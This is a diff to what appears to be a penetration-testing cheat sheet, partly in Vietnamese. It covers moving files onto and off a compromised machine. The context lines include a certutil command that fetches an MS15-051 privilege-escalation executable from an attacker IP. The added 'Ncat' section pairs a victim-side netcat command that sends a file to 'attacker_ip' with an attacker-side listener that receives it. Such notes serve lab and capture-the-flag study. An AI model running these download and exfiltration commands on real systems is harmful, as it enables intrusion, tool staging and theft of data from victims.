@@ -31,3 +31,17 @@ certutil -urlcache -f http://10.10.14.48:8000/ms15-051.exe ech0_privesc.exe
 ``` wget http://filename -O finame ```
 
 ``` curl http://www.abc.com/123/def/ghi/jkl.mno -o filename ```
+
+# Ncat
+
+```
+victim
+nc -nv attacker_ip attacker_open_port < file_muon_treuyen
+```
+
+```
+attack hhost
+
+nc -lvnp open_port > file_muốn_truyền
+
+```
